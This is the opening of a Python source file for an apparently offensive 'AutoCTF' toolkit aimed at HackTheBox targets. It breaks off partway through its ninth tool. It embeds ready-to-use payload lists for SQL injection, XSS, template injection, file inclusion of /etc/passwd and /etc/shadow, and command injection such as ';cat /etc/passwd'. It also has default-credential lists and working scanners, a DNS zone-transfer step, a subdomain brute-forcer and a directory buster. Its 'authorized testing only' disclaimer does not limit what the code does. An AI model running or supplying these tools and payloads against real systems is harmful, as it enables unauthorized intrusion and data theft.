#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════════════
#  0x5da AutoCTF — HackTheBox Automated CTF Toolkit
#  Created by 0x5da (Toasty / OsintToast / WoahToast)
#  Exploit Developer & Security Engineer
#  https://github.com/0x5da
#
#  All code written by 0x5da. Unauthorized redistribution or modification
#  is prohibited. This software is provided for authorized security testing
#  on platforms you own or have explicit permission to assess (e.g. HTB).
# ═══════════════════════════════════════════════════════════════════════════════
"""
0x5da AutoCTF — HackTheBox VPS Auto-Hack Toolkit v2.0.0
Created by 0x5da (Toasty / OsintToast / WoahToast)

Single-file automated VPS hacking toolkit with 30 built-in exploit modules.
Full Auto-Hack mode chains every tool to pwn the target automatically.
Designed for HackTheBox and authorized penetration testing only.
"""

import socket
import struct
import threading
import time
import sys
import os
import re
import hashlib
import base64
import codecs
import urllib.parse
import urllib.request
import urllib.error
import http.client
import ssl
import json
import subprocess
import string
import random
import signal
import ftplib
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, OrderedDict
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════════════════
#  BRANDING & CONSTANTS — 0x5da (Toasty / OsintToast / WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

__version__ = "2.0.0"
__author__ = "0x5da"
__aliases__ = "Toasty / OsintToast / WoahToast"
__signature__ = "0x5da-AutoCTF-Toasty"
__codename__ = "WoahToast"
__built_by__ = f"{__author__} ({__aliases__})"

_0x5da_INTEGRITY = hashlib.sha256(
    f"{__author__}:{__aliases__}:{__signature__}:{__codename__}".encode()
).hexdigest()[:16]


# ═══════════════════════════════════════════════════════════════════════════════
#  TERMINAL COLORS
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    CY = "\033[96m"
    W = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RST = "\033[0m"
    BG_R = "\033[41m"
    BG_G = "\033[42m"
    BG_B = "\033[44m"


def _sig():
    return f"{C.DIM}[0x5da]{C.RST}"


def info(msg):
    print(f"  {C.CY}[*]{C.RST} {msg}")


def success(msg):
    print(f"  {C.G}[+]{C.RST} {msg}")


def warning(msg):
    print(f"  {C.Y}[!]{C.RST} {msg}")


def error(msg):
    print(f"  {C.R}[-]{C.RST} {msg}")


def header(msg):
    width = 70
    print(f"\n  {C.CY}{C.BOLD}{'═' * width}{C.RST}")
    print(f"  {C.CY}{C.BOLD}  {msg}{C.RST}")
    print(f"  {C.CY}{C.BOLD}{'═' * width}{C.RST}\n")


def subheader(msg):
    print(f"\n  {C.B}{C.BOLD}── {msg} ──{C.RST}\n")


BANNER = f"""
{C.CY}{C.BOLD}
    ██████╗ ██╗  ██╗███████╗██████╗  █████╗
   ██╔═████╗╚██╗██╔╝██╔════╝██╔══██╗██╔══██╗
   ██║██╔██║ ╚███╔╝ ███████╗██║  ██║███████║
   ████╔╝██║ ██╔██╗ ╚════██║██║  ██║██╔══██║
   ╚██████╔╝██╔╝ ██╗███████║██████╔╝██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝{C.RST}

   {C.W}{C.BOLD}A U T O  C T F  ·  H T B  T O O L K I T{C.RST}
   {C.DIM}v{__version__} — Created by {__built_by__}{C.RST}
   {C.DIM}Integrity: {_0x5da_INTEGRITY}{C.RST}
"""


# ═══════════════════════════════════════════════════════════════════════════════
#  EMBEDDED WORDLISTS — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 88, 110, 111, 119, 135, 139, 143, 161, 162,
    199, 389, 443, 445, 465, 512, 513, 514, 515, 548, 554, 587, 631, 636,
    646, 873, 990, 993, 995, 1025, 1026, 1027, 1028, 1029, 1110, 1433,
    1720, 1723, 1755, 1900, 2000, 2049, 2121, 2717, 3000, 3128, 3306,
    3389, 3986, 4000, 4001, 4443, 4444, 5000, 5009, 5051, 5060, 5101,
    5190, 5357, 5432, 5631, 5666, 5800, 5900, 5985, 5986, 6000, 6001,
    6379, 6646, 7070, 7474, 8000, 8008, 8009, 8080, 8081, 8443, 8888,
    9000, 9090, 9100, 9200, 9999, 10000, 10443, 11211, 27017, 27018,
    28017, 32768, 49152, 49153, 49154, 49155, 49156, 49157,
]

UDP_PORTS = [53, 67, 68, 69, 123, 161, 162, 500, 514, 623, 1434, 1900, 5353]

WEB_DIRS = [
    "", "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "dashboard", "panel", "cpanel", "phpmyadmin", "server-status",
    "server-info", "robots.txt", "sitemap.xml", ".git/HEAD", ".env",
    ".htaccess", "backup", "backups", "config", "config.php", "db",
    "database", "debug", "test", "testing", "dev", "development",
    "api", "api/v1", "api/v2", "uploads", "upload", "files", "images",
    "img", "css", "js", "static", "assets", "media", "tmp", "temp",
    "cgi-bin", "bin", "scripts", "shell", "cmd", "command", "exec",
    "console", "manager", "wp-content", "wp-includes", "wp-json",
    "xmlrpc.php", "readme.html", "changelog.txt", "license.txt",
    "info.php", "phpinfo.php", "info", "status", "health", "metrics",
    "swagger", "docs", "documentation", "graphql", "graphiql", ".svn",
    ".DS_Store", "web.config", "crossdomain.xml", "clientaccesspolicy.xml",
    "elmah.axd", "trace.axd", "error", "errors", "log", "logs",
    ".well-known", "actuator", "actuator/env", "actuator/health",
    "solr", "jenkins", "nagios", "wp-json/wp/v2/users", "feed",
    "xmlrpc.php", "install", "setup", "INSTALL.txt", "CHANGELOG.txt",
    "secret", "private", "internal", "old", "new", "portal",
]

WEB_EXTENSIONS = [".php", ".html", ".txt", ".bak", ".old", ".asp", ".aspx",
                  ".jsp", ".py", ".pl", ".cgi", ".conf", ".xml", ".json",
                  ".zip", ".tar.gz", ".sql", ".log"]

SUBDOMAINS = [
    "www", "mail", "ftp", "smtp", "pop", "ns1", "ns2", "dns", "mx",
    "webmail", "admin", "blog", "shop", "dev", "staging", "test",
    "api", "m", "mobile", "app", "portal", "vpn", "remote", "secure",
    "login", "gateway", "proxy", "cdn", "static", "assets", "img",
    "images", "media", "backup", "db", "database", "mysql", "mongo",
    "redis", "elastic", "kibana", "grafana", "jenkins", "gitlab",
    "git", "svn", "ci", "cd", "docker", "k8s", "kube",
]

COMMON_USERS = [
    "admin", "root", "user", "test", "guest", "administrator", "oracle",
    "postgres", "mysql", "ftp", "anonymous", "info", "www", "web",
    "backup", "operator", "manager", "support", "service", "deploy",
]

COMMON_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "pass", "test",
    "guest", "master", "changeme", "letmein", "welcome", "monkey",
    "dragon", "login", "abc123", "qwerty", "password1", "1234",
    "12345", "123456789", "1234567890", "iloveyou", "sunshine",
    "princess", "football", "charlie", "shadow", "michael", "passwd",
    "administrator", "P@ssw0rd", "P@ssword1", "p@ssw0rd", "default",
    "server", "cluster", "vagrant", "ansible", "docker", "ubuntu",
    "alpine", "centos", "debian", "redhat", "oracle", "mysql",
    "postgres", "database", "backup", "supersecret", "s3cret",
]

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
    "\" OR 1=1--", "' OR 1=1#", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--", "1' ORDER BY 10--",
    "'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--", "1 AND SLEEP(5)",
    "' AND '1'='1", "' AND '1'='2", "admin'--", "1' AND 1=1--",
    "1' AND 1=2--", "1 UNION ALL SELECT 1,2,3",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for odbc drivers",
    "microsoft ole db provider for sql server",
    "incorrect syntax near", "unexpected end of sql command",
    "invalid query", "sql command not properly ended",
    "pg_query", "pg_exec", "postgresql", "sqlite3",
    "ora-00933", "ora-00921", "ora-01756",
    "sqlstate", "syntax error", "mysql_fetch",
    "mysql_num_rows", "mysql_query", "mysqli_",
    "pdo::query", "pdostatement::execute",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
]

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "../../../../../../etc/hosts",
    "../../../../../../etc/hostname",
    "../../../../../../proc/self/environ",
    "../../../../../../proc/self/cmdline",
    "../../../../../../proc/version",
    "../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../windows/win.ini",
    "....//....//....//....//....//etc/passwd",
    "..%252f..%252f..%252f..%252f..%252fetc/passwd",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=config",
    "php://input",
    "file:///etc/passwd",
    "expect://id",
    "/etc/passwd%00",
    "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
]

LFI_MARKERS = [
    "root:x:0:0:", "root:0:0:", "[fonts]", "[extensions]",
    "127.0.0.1", "localhost", "HTTP_USER_AGENT", "Linux version",
    "DOCUMENT_ROOT", "SERVER_SOFTWARE",
]

CMDI_PAYLOADS = [
    (";id", "uid="), ("|id", "uid="), ("&&id", "uid="),
    ("||id", "uid="), ("`id`", "uid="), ("$(id)", "uid="),
    (";whoami", ""), ("|whoami", ""), ("&&whoami", ""),
    (";cat /etc/passwd", "root:"), ("|cat /etc/passwd", "root:"),
    (";uname -a", "Linux"), ("|uname -a", "Linux"),
    ("$(whoami)", ""), ("`whoami`", ""),
]

SNMP_COMMUNITIES = [
    "public", "private", "community", "manager", "cisco", "admin",
    "snmp", "default", "monitor", "secret", "test", "guest",
    "read", "write", "network", "system", "router", "switch",
]

WP_PLUGINS = [
    "akismet", "contact-form-7", "jetpack", "wordfence", "yoast-seo",
    "woocommerce", "elementor", "wp-super-cache", "w3-total-cache",
    "all-in-one-seo-pack", "wordpress-seo", "google-analytics-for-wordpress",
    "updraftplus", "redirection", "really-simple-ssl", "classic-editor",
    "duplicate-post", "wp-mail-smtp", "limit-login-attempts-reloaded",
    "loginizer", "sucuri-scanner", "better-wp-security", "ithemes-security",
    "all-in-one-wp-migration", "duplicator", "wp-file-manager",
    "easy-wp-smtp", "mail-bank", "ninja-forms", "wpforms-lite",
]


# ═══════════════════════════════════════════════════════════════════════════════
#  HTTP HELPER — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE


class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Intercept redirects and return them as-is instead of following."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(newurl, code, msg, headers, fp)


def http_request(url, method="GET", data=None, headers=None, timeout=10, follow=True):
    """Perform an HTTP request using urllib. Returns (status, headers_dict, body) or None."""
    try:
        hdrs = {"User-Agent": f"0x5da-AutoCTF/{__version__} ({__codename__})"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, method=method)
        for k, v in hdrs.items():
            req.add_header(k, v)
        if data:
            req.data = data.encode() if isinstance(data, str) else data
        handlers = [urllib.request.HTTPSHandler(context=_ssl_ctx)]
        if not follow:
            handlers.append(_NoRedirectHandler())
        opener = urllib.request.build_opener(*handlers)
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            body = ""
        return e.code, dict(e.headers), body
    except Exception:
        return None


def http_get(url, **kwargs):
    return http_request(url, method="GET", **kwargs)


def http_post(url, data=None, **kwargs):
    return http_request(url, method="POST", data=data, **kwargs)


# ═══════════════════════════════════════════════════════════════════════════════
#  NETWORK HELPERS — 0x5da (WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tcp_connect(host, port, timeout=3):
    """Attempt a TCP connection. Returns True if port is open."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False


def grab_banner_raw(host, port, timeout=5, probe=b""):
    """Connect to a port and grab the banner."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if probe:
            s.sendall(probe)
        banner = s.recv(4096).decode("utf-8", errors="replace").strip()
        s.close()
        return banner
    except Exception:
        return ""


def resolve_host(target):
    """Resolve a hostname to IP address."""
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        return None


def is_ip(target):
    """Check if target is a valid IP address."""
    try:
        socket.inet_aton(target)
        return True
    except socket.error:
        return False


def get_service_name(port):
    """Get the service name for a given port."""
    try:
        return socket.getservbyport(port)
    except OSError:
        known = {
            4444: "metasploit", 5985: "winrm", 5986: "winrm-ssl",
            8080: "http-proxy", 8443: "https-alt", 9090: "zeus-admin",
            9200: "elasticsearch", 27017: "mongodb", 6379: "redis",
            11211: "memcached", 3000: "ppp/grafana", 5432: "postgresql",
        }
        return known.get(port, "unknown")


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 01: TCP PORT SCANNER — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_port_scan(target, ports=None, threads=200, timeout=2):
    """
    0x5da TCP Port Scanner — Multi-threaded connect scan.
    Scans target for open TCP ports with configurable thread count.
    """
    if ports is None:
        ports = COMMON_PORTS
    header(f"0x5da TCP Port Scanner → {target}")
    info(f"Scanning {len(ports)} ports with {threads} threads (timeout {timeout}s)")

    open_ports = []
    scanned = [0]
    lock = threading.Lock()
    total = len(ports)

    def scan_port(port):
        result = tcp_connect(target, port, timeout)
        with lock:
            scanned[0] += 1
            if scanned[0] % 50 == 0 or scanned[0] == total:
                pct = int(scanned[0] / total * 100)
                print(f"\r  {C.DIM}[{_sig()}] Progress: {scanned[0]}/{total} ({pct}%){C.RST}", end="", flush=True)
        if result:
            svc = get_service_name(port)
            with lock:
                open_ports.append((port, svc))
            success(f"Port {port}/{svc} is {C.G}OPEN{C.RST}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(scan_port, p) for p in ports]
        for f in as_completed(futures):
            f.result()

    print()
    open_ports.sort(key=lambda x: x[0])
    subheader("Scan Results")
    if open_ports:
        for port, svc in open_ports:
            print(f"    {C.G}●{C.RST} {port:>5}/tcp  {C.W}{svc}{C.RST}")
    else:
        warning("No open ports found")
    print(f"\n  {C.DIM}Scanned by 0x5da AutoCTF (Toasty){C.RST}")
    return open_ports


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 02: UDP PORT SCANNER — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_udp_scan(target, ports=None, timeout=3):
    """
    0x5da UDP Port Scanner — Sends probes to common UDP ports.
    Detects open or open|filtered UDP services.
    """
    if ports is None:
        ports = UDP_PORTS
    header(f"0x5da UDP Port Scanner → {target}")
    info(f"Probing {len(ports)} UDP ports (timeout {timeout}s)")

    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            probe = b"\x00" * 8
            if port == 53:
                probe = (b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                         b"\x07version\x04bind\x00\x00\x10\x00\x03")
            elif port == 161:
                probe = _build_snmp_get("public")
            elif port == 123:
                probe = b"\x1b" + b"\x00" * 47
            s.sendto(probe, (target, port))
            try:
                data, _ = s.recvfrom(4096)
                if data:
                    svc = get_service_name(port)
                    open_ports.append((port, svc))
                    success(f"Port {port}/udp ({svc}) is {C.G}OPEN{C.RST}")
            except socket.timeout:
                pass
            s.close()
        except Exception:
            pass

    subheader("UDP Results")
    if open_ports:
        for port, svc in open_ports:
            print(f"    {C.G}●{C.RST} {port:>5}/udp  {C.W}{svc}{C.RST}")
    else:
        info("No confirmed open UDP ports (may be filtered)")
    print(f"\n  {C.DIM}Scanned by 0x5da AutoCTF (OsintToast){C.RST}")
    return open_ports


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 03: SERVICE BANNER GRABBER — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_banner_grab(target, open_ports):
    """
    0x5da Banner Grabber — Connects to open ports and grabs service banners.
    Sends service-specific probes to identify versions.
    """
    header(f"0x5da Banner Grabber → {target}")
    banners = {}

    http_probe = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: 0x5da-AutoCTF\r\nConnection: close\r\n\r\n"

    for port, svc in open_ports:
        probe = b""
        if port in (80, 443, 8080, 8443, 8000, 8888, 3000, 9090):
            probe = http_probe.encode()
        elif port == 21:
            probe = b""
        elif port in (25, 587):
            probe = b"EHLO 0x5da\r\n"
        elif port == 110:
            probe = b""
        elif port == 143:
            probe = b""
        elif port == 3306:
            probe = b""
        else:
            probe = b"\r\n"

        banner = grab_banner_raw(target, port, timeout=5, probe=probe)
        if banner:
            banners[port] = banner
            display = banner[:120].replace("\n", " ").replace("\r", "")
            success(f"{port:>5}/tcp  {C.W}{display}{C.RST}")
        else:
            banners[port] = ""
            info(f"{port:>5}/tcp  {C.DIM}(no banner){C.RST}")

    print(f"\n  {C.DIM}Grabbed by 0x5da AutoCTF (Toasty){C.RST}")
    return banners


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 04: OS FINGERPRINTER — 0x5da (WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_os_fingerprint(target, open_ports):
    """
    0x5da OS Fingerprinter — Guesses target OS from TTL values and banners.
    Analyzes TCP response characteristics.
    """
    header(f"0x5da OS Fingerprinter → {target}")
    os_guess = "Unknown"
    ttl = None
    details = []

    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "3", target],
            capture_output=True, text=True, timeout=10
        )
        ttl_match = re.search(r"ttl=(\d+)", result.stdout, re.IGNORECASE)
        if ttl_match:
            ttl = int(ttl_match.group(1))
    except Exception:
        pass

    if ttl:
        if ttl <= 64:
            os_guess = "Linux/Unix/macOS"
            details.append(f"TTL={ttl} → Linux/Unix range (<=64)")
        elif ttl <= 128:
            os_guess = "Windows"
            details.append(f"TTL={ttl} → Windows range (65-128)")
        else:
            os_guess = "Cisco/Solaris/Network Device"
            details.append(f"TTL={ttl} → Network device range (129-255)")
    else:
        details.append("TTL unavailable (ICMP blocked or host down)")

    banners = {}
    for port, svc in open_ports[:3]:
        b = grab_banner_raw(target, port, timeout=3)
        if b:
            banners[port] = b

    for port, banner in banners.items():
        bl = banner.lower()
        if "ubuntu" in bl or "debian" in bl:
            os_guess = "Linux (Ubuntu/Debian)"
            details.append(f"Port {port} banner contains Ubuntu/Debian reference")
        elif "centos" in bl or "red hat" in bl or "fedora" in bl:
            os_guess = "Linux (CentOS/RHEL)"
            details.append(f"Port {port} banner contains CentOS/RHEL reference")
        elif "windows" in bl or "microsoft" in bl or "iis" in bl:
            os_guess = "Windows"
            details.append(f"Port {port} banner contains Windows/IIS reference")
        elif "freebsd" in bl:
            os_guess = "FreeBSD"
            details.append(f"Port {port} banner contains FreeBSD reference")
        elif "apache" in bl:
            details.append(f"Port {port}: Apache detected")
        elif "nginx" in bl:
            details.append(f"Port {port}: Nginx detected")
        elif "openssh" in bl:
            details.append(f"Port {port}: OpenSSH detected")
            ver_match = re.search(r"OpenSSH[_\s](\S+)", banner)
            if ver_match:
                details.append(f"  SSH version: {ver_match.group(1)}")

    subheader("OS Fingerprint Results")
    print(f"    {C.BOLD}OS Guess:{C.RST}  {C.G}{os_guess}{C.RST}")
    if ttl:
        print(f"    {C.BOLD}TTL:{C.RST}       {ttl}")
    for d in details:
        print(f"    {C.DIM}→ {d}{C.RST}")

    print(f"\n  {C.DIM}Fingerprinted by 0x5da AutoCTF (WoahToast){C.RST}")
    return os_guess, details


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 05: DNS RECON — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_dns_recon(target):
    """
    0x5da DNS Recon — Enumerates DNS records and attempts zone transfers.
    Queries A, AAAA, MX, NS, TXT, SOA records.
    """
    header(f"0x5da DNS Recon → {target}")
    results = defaultdict(list)

    if is_ip(target):
        try:
            hostname = socket.gethostbyaddr(target)[0]
            results["ptr"].append(hostname)
            success(f"PTR: {hostname}")
        except Exception:
            info("No PTR record found")
        print(f"\n  {C.DIM}DNS Recon by 0x5da (Toasty){C.RST}")
        return dict(results)

    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]:
        try:
            out = subprocess.check_output(
                ["dig", "+short", rtype, target],
                stderr=subprocess.DEVNULL, timeout=10
            ).decode().strip()
            if out:
                for line in out.split("\n"):
                    line = line.strip()
                    if line:
                        results[rtype.lower()].append(line)
                        success(f"{rtype:>5}: {line}")
        except FileNotFoundError:
            try:
                out = subprocess.check_output(
                    ["host", f"-t", rtype.lower(), target],
                    stderr=subprocess.DEVNULL, timeout=10
                ).decode().strip()
                for line in out.split("\n"):
                    if "not found" not in line.lower() and "has no" not in line.lower():
                        results[rtype.lower()].append(line.strip())
                        success(f"{rtype:>5}: {line.strip()}")
            except Exception:
                pass
        except Exception:
            pass

    info("Attempting zone transfer...")
    ns_servers = results.get("ns", [])
    for ns in ns_servers:
        ns = ns.rstrip(".")
        try:
            out = subprocess.check_output(
                ["dig", "axfr", target, f"@{ns}"],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode()
            if "Transfer failed" not in out and "XFR size" in out:
                results["axfr"] = out
                success(f"Zone transfer successful from {ns}!")
            else:
                info(f"Zone transfer denied by {ns}")
        except Exception:
            info(f"Zone transfer failed for {ns}")

    print(f"\n  {C.DIM}DNS Recon by 0x5da AutoCTF (Toasty){C.RST}")
    return dict(results)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 06: SUBDOMAIN ENUMERATOR — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_subdomain_enum(target, wordlist=None, threads=50):
    """
    0x5da Subdomain Enumerator — Brute-forces subdomains via DNS resolution.
    Uses embedded or custom wordlist with multi-threaded lookups.
    """
    header(f"0x5da Subdomain Enumerator → {target}")
    subs = wordlist or SUBDOMAINS
    if isinstance(subs, str) and os.path.isfile(subs):
        with open(subs) as f:
            subs = [line.strip() for line in f if line.strip()]

    info(f"Testing {len(subs)} subdomains with {threads} threads")
    found = []
    lock = threading.Lock()

    def check_sub(sub):
        fqdn = f"{sub}.{target}"
        try:
            ips = socket.getaddrinfo(fqdn, None)
            ip_list = list(set(addr[4][0] for addr in ips))
            with lock:
                found.append((fqdn, ip_list))
            success(f"{fqdn} → {', '.join(ip_list)}")
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_sub, s) for s in subs]
        for f in as_completed(futures):
            f.result()

    subheader("Discovered Subdomains")
    if found:
        for fqdn, ips in sorted(found):
            print(f"    {C.G}●{C.RST} {fqdn}  →  {', '.join(ips)}")
    else:
        info("No subdomains found")
    print(f"\n  {C.DIM}Enumerated by 0x5da AutoCTF (OsintToast){C.RST}")
    return found


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 07: DIRECTORY BUSTER — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_dir_buster(target, port=80, ssl_on=False, wordlist=None, extensions=None, threads=30):
    """
    0x5da Directory Buster — Brute-forces web directories and files.
    Multi-threaded HTTP requests with status code filtering.
    """
    scheme = "https" if ssl_on or port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"
    header(f"0x5da Directory Buster → {base_url}")

    dirs = wordlist if isinstance(wordlist, list) else WEB_DIRS
    if isinstance(wordlist, str) and os.path.isfile(wordlist):
        with open(wordlist) as f:
            dirs = [line.strip() for line in f if line.strip()]

    exts = extensions or [""]
    paths = []
    for d in dirs:
        for ext in exts:
            paths.append(f"{d}{ext}")
    paths = list(OrderedDict.fromkeys(paths))

    info(f"Testing {len(paths)} paths with {threads} threads")
    found = []
    lock = threading.Lock()
    checked = [0]
    total = len(paths)

    def check_path(path):
        url = f"{base_url}/{path}"
        result = http_get(url, timeout=8)
        with lock:
            checked[0] += 1
            if checked[0] % 25 == 0:
                pct = int(checked[0] / total * 100)
                print(f"\r  {C.DIM}[0x5da] Progress: {checked[0]}/{total} ({pct}%){C.RST}", end="", flush=True)
        if result:
            status, hdrs, body = result
            if status in (200, 201, 204, 301, 302, 307, 308, 401, 403, 405, 500):
                size = len(body)
                with lock:
                    found.append((path, status, size))
                color = C.G if status == 200 else C.Y if status in (301, 302) else C.R if status == 403 else C.M
                print(f"\r  {color}[{status}]{C.RST} /{path}  {C.DIM}({size} bytes){C.RST}                    ")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_path, p) for p in paths]
        for f in as_completed(futures):
            f.result()

    print()
    subheader("Discovered Paths")
    if found:
        for path, status, size in sorted(found, key=lambda x: x[1]):
            color = C.G if status == 200 else C.Y if status in (301, 302) else C.R
            print(f"    {color}[{status}]{C.RST} /{path}  {C.DIM}({size}B){C.RST}")
    else:
        info("No paths discovered")
    print(f"\n  {C.DIM}Busted by 0x5da AutoCTF (Toasty){C.RST}")
    return found


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 08: WEB RECON — 0x5da (WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_web_recon(target, port=80, ssl_on=False):
    """
    0x5da Web Recon — Analyzes robots.txt, sitemap, headers, and cookies.
    Identifies information leaks and interesting configurations.
    """
    scheme = "https" if ssl_on or port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"
    header(f"0x5da Web Recon → {base_url}")
    findings = defaultdict(list)

    subheader("HTTP Headers Analysis")
    result = http_get(f"{base_url}/", timeout=10)
    if result:
        status, hdrs, body = result
        success(f"Status: {status}")
        interesting_headers = [
            "server", "x-powered-by", "x-aspnet-version", "x-generator",
            "x-drupal-cache", "x-varnish", "x-cache", "x-frame-options",
            "x-xss-protection", "x-content-type-options",
            "strict-transport-security", "content-security-policy",
            "access-control-allow-origin", "www-authenticate",
            "set-cookie",
        ]
        for h in interesting_headers:
            val = hdrs.get(h) or hdrs.get(h.title())
            if val:
                findings["headers"].append((h, val))
                is_security = h in ("x-frame-options", "x-xss-protection",
                                    "x-content-type-options", "strict-transport-security",
                                    "content-security-policy")
                color = C.G if is_security else C.Y
                print(f"    {color}{h}:{C.RST} {val}")

        missing_security = []
        for sh in ["X-Frame-Options", "X-Content-Type-Options",
                    "Strict-Transport-Security", "Content-Security-Policy"]:
            if not hdrs.get(sh) and not hdrs.get(sh.lower()):
                missing_security.append(sh)
        if missing_security:
            warning(f"Missing security headers: {', '.join(missing_security)}")
            findings["missing_security"] = missing_security
    else:
        error("Could not connect to web server")

    subheader("robots.txt")
    result = http_get(f"{base_url}/robots.txt", timeout=8)
    if result and result[0] == 200:
        success("robots.txt found!")
        for line in result[2].split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                findings["robots"].append(line)
                dl = line.lower()
                color = C.Y if "disallow" in dl else C.G
                print(f"    {color}{line}{C.RST}")
    else:
        info("No robots.txt found")

    subheader("sitemap.xml")
    result = http_get(f"{base_url}/sitemap.xml", timeout=8)
    if result and result[0] == 200:
        success("sitemap.xml found!")
        urls = re.findall(r"<loc>(.*?)</loc>", result[2])
        for u in urls[:20]:
            findings["sitemap"].append(u)
            print(f"    {C.CY}{u}{C.RST}")
        if len(urls) > 20:
            info(f"... and {len(urls) - 20} more URLs")
    else:
        info("No sitemap.xml found")

    subheader("HTML Analysis")
    result = http_get(f"{base_url}/", timeout=10)
    if result and result[0] == 200:
        body = result[2]
        title_match = re.search(r"<title>(.*?)</title>", body, re.IGNORECASE)
        if title_match:
            findings["title"] = title_match.group(1)
            info(f"Title: {title_match.group(1)}")
        gen_match = re.search(r'<meta\s+name=["\']generator["\']\s+content=["\'](.*?)["\']',
                              body, re.IGNORECASE)
        if gen_match:
            findings["generator"] = gen_match.group(1)
            success(f"Generator: {gen_match.group(1)}")
        comments = re.findall(r"<!--(.*?)-->", body, re.DOTALL)
        if comments:
            findings["comments"] = len(comments)
            info(f"Found {len(comments)} HTML comments")
            for c in comments[:5]:
                c = c.strip()[:100]
                if c:
                    print(f"    {C.DIM}<!-- {c} -->{C.RST}")
        forms = re.findall(r"<form[^>]*>", body, re.IGNORECASE)
        if forms:
            findings["forms"] = len(forms)
            info(f"Found {len(forms)} forms")
            for f in forms:
                action = re.search(r'action=["\']([^"\']*)["\']', f, re.IGNORECASE)
                method = re.search(r'method=["\']([^"\']*)["\']', f, re.IGNORECASE)
                print(f"    {C.CY}action={action.group(1) if action else '?'} "
                      f"method={method.group(1) if method else 'GET'}{C.RST}")

    print(f"\n  {C.DIM}Recon by 0x5da AutoCTF (WoahToast){C.RST}")
    return dict(findings)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 09: TECH FINGERPRINTER — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_tech_fingerprint(target, port=80, ssl_on=False):
    """
